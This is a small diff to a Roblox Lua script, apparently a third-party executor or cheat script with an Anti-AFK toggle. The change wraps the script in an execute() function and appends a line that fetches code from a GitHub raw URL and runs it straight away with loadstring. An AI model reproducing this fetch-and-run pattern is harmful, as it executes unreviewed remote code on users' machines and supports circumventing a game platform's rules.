@@ -1,4 +1,5 @@
-local Workspace = game:GetService("Workspace")
+function execute()
+ local Workspace = game:GetService("Workspace")
 local Run = game:GetService("RunService")
 local Gui = game:GetService("GuiService")
 local Stats = game:GetService("Stats")
@@ -117,3 +118,6 @@ local t23 = w:Toggle('Anti-AFK', {
         print("Anti-AFK =", aa)
     end
 end)
+end
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Scripty/main/R.Key")()
